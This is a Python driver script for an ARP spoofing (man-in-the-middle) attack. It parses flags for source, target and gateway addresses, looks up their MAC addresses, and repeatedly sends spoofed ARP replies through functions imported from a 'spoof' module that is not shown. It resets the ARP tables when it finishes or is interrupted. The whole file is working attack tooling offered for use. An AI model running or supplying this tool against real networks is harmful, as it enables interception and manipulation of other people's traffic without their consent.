import sys
from spoof import *

def CheckFlags(required, arguments):
	for flag in required:
		if flag not in arguments: ThrowError("Required flag criteria not met.")

def ThrowError(message):
	print(f"[*] {message}")
	sys.exit()

try:
	CheckFlags(REQUIRED_FLAGS, sys.argv)
	
	attack_length   = DEFAULT_LENGTH
	request_timeout = DEFAULT_TIMEOUT

	source_mac  = None
	target_mac  = None
	gateway_mac = None

	source_address  = None
	target_address  = None
	gateway_address = None

	for argument in range(0, len(sys.argv)):
		match sys.argv[argument]:
			case '-s':
				source_address = sys.argv[argument + 1]
			case '-t':
				target_address = sys.argv[argument + 1]
			case '-g':
				gateway_address = sys.argv[argument + 1]
			case '-l':
				attack_length = int(sys.argv[argument + 1])
			case '-d':
				request_timeout = int(sys.argv[argument + 1])

	source_mac  = GetMAC(source_address, request_timeout)
	target_mac  = GetMAC(target_address, request_timeout)
	gateway_mac = GetMAC(gateway_address, request_timeout)

	print(f"[*] Temporarily disguising as {target_address} for {attack_length} second(s) and an abandon packet interval of {request_timeout} second(s)")

	counter = 0
	while counter < attack_length:
		print(SpoofARP(target_address, gateway_address, source_mac, target_mac, gateway_mac))
		counter += 1
		time.sleep(1)

	ResetARP(target_address, gateway_address, target_mac, gateway_mac)
except IndexError:
	ThrowError("Source, target and router not specified.")
except KeyboardInterrupt:
	ResetARP(target_address, gateway_address, target_mac, gateway_mac)
	ThrowError("Interrupted. Reverting all ARP changes.")
except ValueError:
	ThrowError("There was an error. Please check the flag values you provided.")